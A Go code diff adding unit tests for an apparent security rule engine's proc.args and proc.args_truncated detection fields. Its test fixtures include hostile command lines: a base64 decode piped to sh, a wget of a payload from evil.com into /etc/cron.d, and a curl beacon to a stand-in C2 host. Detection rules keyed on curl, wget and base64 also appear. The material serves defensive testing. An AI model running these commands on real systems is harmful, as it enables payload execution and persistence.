@@ -1207,3 +1207,267 @@ func TestFDEnrichmentValidation(t *testing.T) {
 		require.NoError(t, err)
 	})
 }
+
+// TestProcArgsEnrichment verifies that proc.args and proc.args_truncated fields
+// work correctly in rule conditions for syscall, file, and network event types.
+func TestProcArgsEnrichment(t *testing.T) {
+	t.Run("proc.args regex matches curl pastebin on syscall event", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_001",
+			Name:      "Suspicious curl download",
+			EventType: types.EventSyscall,
+			Condition: RuleCondition{
+				Field:  "proc.args",
+				Op:     OpRegex,
+				Values: []string{`curl.*pastebin\.com`},
+			},
+			Severity: types.SeverityCritical,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+		event := types.Event{
+			Type:     types.EventSyscall,
+			ProcArgs: "curl https://pastebin.com/abc123",
+			Syscall:  &types.SyscallEvent{Nr: 59},
+		}
+		alerts := engine.Evaluate(event)
+		require.Len(t, alerts, 1)
+		assert.Equal(t, "pa_001", alerts[0].RuleID)
+	})
+
+	t.Run("proc.args contains base64 on syscall event", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_002",
+			Name:      "Base64 payload execution",
+			EventType: types.EventSyscall,
+			Condition: RuleCondition{
+				Field:  "proc.args",
+				Op:     OpContains,
+				Values: []string{"base64"},
+			},
+			Severity: types.SeverityCritical,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+
+		event := types.Event{
+			Type:     types.EventSyscall,
+			ProcArgs: "bash -c echo dGVzdA== | base64 -d | sh",
+			Syscall:  &types.SyscallEvent{Nr: 59},
+		}
+		alerts := engine.Evaluate(event)
+		require.Len(t, alerts, 1, "rule should fire when proc.args contains 'base64'")
+		assert.Equal(t, "pa_002", alerts[0].RuleID)
+
+		noMatchEvent := types.Event{
+			Type:     types.EventSyscall,
+			ProcArgs: "bash -c echo hello",
+			Syscall:  &types.SyscallEvent{Nr: 59},
+		}
+		alerts = engine.Evaluate(noMatchEvent)
+		assert.Empty(t, alerts, "rule should not fire when proc.args lacks 'base64'")
+	})
+
+	t.Run("proc.args empty does not fire", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_003",
+			Name:      "Any base64 exec",
+			EventType: types.EventSyscall,
+			Condition: RuleCondition{
+				Field:  "proc.args",
+				Op:     OpContains,
+				Values: []string{"base64"},
+			},
+			Severity: types.SeverityWarning,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+		event := types.Event{
+			Type:     types.EventSyscall,
+			ProcArgs: "",
+			Syscall:  &types.SyscallEvent{Nr: 59},
+		}
+		alerts := engine.Evaluate(event)
+		assert.Empty(t, alerts)
+	})
+
+	t.Run("proc.args available for file access events", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_004",
+			Name:      "wget writing to etc",
+			EventType: types.EventFileAccess,
+			Condition: RuleCondition{
+				Field:  "proc.args",
+				Op:     OpContains,
+				Values: []string{"wget"},
+			},
+			Severity: types.SeverityWarning,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+		event := types.Event{
+			Type:     types.EventFileAccess,
+			ProcArgs: "wget -O /etc/cron.d/evil http://evil.com/payload",
+			File:     &types.FileEvent{Op: 2},
+		}
+		alerts := engine.Evaluate(event)
+		require.Len(t, alerts, 1)
+		assert.Equal(t, "pa_004", alerts[0].RuleID)
+	})
+
+	t.Run("proc.args available for network events", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_005",
+			Name:      "curl beaconing",
+			EventType: types.EventTCPConnect,
+			Condition: RuleCondition{
+				Field:  "proc.args",
+				Op:     OpContains,
+				Values: []string{"curl"},
+			},
+			Severity: types.SeverityWarning,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+		event := types.Event{
+			Type:     types.EventTCPConnect,
+			ProcArgs: "curl http://c2.evil.com/beacon",
+			Network:  &types.NetworkEvent{Dport: 80},
+		}
+		alerts := engine.Evaluate(event)
+		require.Len(t, alerts, 1)
+		assert.Equal(t, "pa_005", alerts[0].RuleID)
+	})
+
+	t.Run("proc.args_truncated field set correctly", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_006",
+			Name:      "Detect truncated args",
+			EventType: types.EventSyscall,
+			Condition: RuleCondition{
+				Field:  "proc.args_truncated",
+				Op:     OpEquals,
+				Values: []string{"true"},
+			},
+			Severity: types.SeverityWarning,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+
+		truncEvent := types.Event{
+			Type:              types.EventSyscall,
+			ProcArgs:          "very long command that was truncated",
+			ProcArgsTruncated: true,
+			Syscall:           &types.SyscallEvent{Nr: 59},
+		}
+		alerts := engine.Evaluate(truncEvent)
+		require.Len(t, alerts, 1)
+
+		normalEvent := types.Event{
+			Type:              types.EventSyscall,
+			ProcArgs:          "short command",
+			ProcArgsTruncated: false,
+			Syscall:           &types.SyscallEvent{Nr: 59},
+		}
+		alerts = engine.Evaluate(normalEvent)
+		assert.Empty(t, alerts)
+	})
+
+	t.Run("proc.args_truncated false by default on event with no args", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_007",
+			Name:      "Not truncated check",
+			EventType: types.EventSyscall,
+			Condition: RuleCondition{
+				Field:  "proc.args_truncated",
+				Op:     OpEquals,
+				Values: []string{"false"},
+			},
+			Severity: types.SeverityWarning,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+		event := types.Event{
+			Type:    types.EventSyscall,
+			Syscall: &types.SyscallEvent{Nr: 1},
+		}
+		alerts := engine.Evaluate(event)
+		require.Len(t, alerts, 1)
+	})
+}
+
+// TestProcArgsValidation verifies that proc.args and proc.args_truncated are
+// accepted as valid field names during rule validation for all supported event types.
+func TestProcArgsValidation(t *testing.T) {
+	for _, tt := range []struct {
+		name      string
+		eventType types.EventType
+	}{
+		{"syscall", types.EventSyscall},
+		{"file", types.EventFileAccess},
+		{"network", types.EventTCPConnect},
+	} {
+		t.Run(tt.name+"/proc.args accepted", func(t *testing.T) {
+			rule := &Rule{
+				ID:        "pav_001",
+				Name:      "test",
+				EventType: tt.eventType,
+				Condition: RuleCondition{Field: "proc.args", Op: OpContains, Values: []string{"test"}},
+				Severity:  types.SeverityWarning,
+				Action:    ActionAlert,
+			}
+			assert.NoError(t, validateRule(rule))
+		})
+		t.Run(tt.name+"/proc.args_truncated accepted", func(t *testing.T) {
+			rule := &Rule{
+				ID:        "pav_002",
+				Name:      "test",
+				EventType: tt.eventType,
+				Condition: RuleCondition{Field: "proc.args_truncated", Op: OpEquals, Values: []string{"true"}},
+				Severity:  types.SeverityWarning,
+				Action:    ActionAlert,
+			}
+			assert.NoError(t, validateRule(rule))
+		})
+	}
+}
+
+// TestContainsOperator verifies the OpContains substring-matching operator.
+func TestContainsOperator(t *testing.T) {
+	rule := Rule{
+		ID:        "co_001",
+		Name:      "Contains test",
+		EventType: types.EventSyscall,
+		Condition: RuleCondition{
+			Field:  "proc.args",
+			Op:     OpContains,
+			Values: []string{"secret"},
+		},
+		Severity: types.SeverityWarning,
+		Action:   ActionAlert,
+	}
+	engine := NewRuleEngine([]Rule{rule})
+
+	cases := []struct {
+		args    string
+		matches bool
+	}{
+		{"export SECRET_KEY=secret123", true},
+		{"cat /etc/secretfile", true},
+		{"ls -la", false},
+		{"", false},
+	}
+	for _, tc := range cases {
+		event := types.Event{
+			Type:     types.EventSyscall,
+			ProcArgs: tc.args,
+			Syscall:  &types.SyscallEvent{Nr: 59},
+		}
+		alerts := engine.Evaluate(event)
+		if tc.matches {
+			assert.Len(t, alerts, 1, "expected match for args=%q", tc.args)
+		} else {
+			assert.Empty(t, alerts, "expected no match for args=%q", tc.args)
+		}
+	}
+}
